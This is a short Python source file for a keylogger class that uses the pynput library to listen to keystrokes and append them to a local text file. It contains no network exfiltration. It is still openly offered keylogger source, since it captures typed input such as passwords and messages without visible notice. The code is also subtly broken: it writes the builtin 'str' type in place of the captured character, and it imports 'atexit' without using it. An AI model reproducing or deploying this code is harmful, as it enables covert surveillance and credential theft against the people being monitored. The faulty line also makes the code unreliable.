from pynput import keyboard
import atexit
import os

class KeyLogger:
    def __init__(self, log_file=None):
        if log_file is None:
            self.log_file = os.path.join(os.path.dirname(__file__), "keyfile.txt")
        else:
            self.log_file = log_file
        self.listener = None

    def keypressed(self, key):
        with open(self.log_file, 'a') as logkey:
            try:
                char = key.char
                logkey.write(str)
            except AttributeError:
                if key == keyboard.Key.space:
                    logkey.write(' ')
                elif key == keyboard.Key.enter:
                    logkey.write('\n')

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.listener = keyboard.Listener(on_press=self.keypressed)
            self.listener.daemon = False 
            self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def cleanup(self):
        """Ensure proper cleanup when the program exits"""
        self.stop() 